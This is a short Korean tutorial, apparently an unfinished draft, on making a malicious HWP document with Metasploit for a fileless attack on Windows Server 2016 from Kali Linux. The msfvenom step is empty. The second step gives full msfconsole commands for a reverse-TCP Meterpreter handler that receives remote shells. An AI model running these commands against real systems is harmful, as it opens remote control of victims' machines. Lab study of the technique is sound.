# 메타스플로잇(Metasploit)를 사용해 악성한글문서(Hwp)만들어 파일리스(Fileless) 공격하기

- 공격 서버 :smiling_imp: : 칼리 리눅스(Kali Linux amd64)
- 공격 대상 :skull: : 윈도우 서버 2016 (Windows Server 2016)

### 1. :smiling_imp: msfvenom으로 악성코드 제작

```
msfvenom
```

### 2. :smiling_imp: 메타스플로잇으로 핸들러 서버 오픈

```
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.0.0
set LPORT 1234
show options
exploit
```
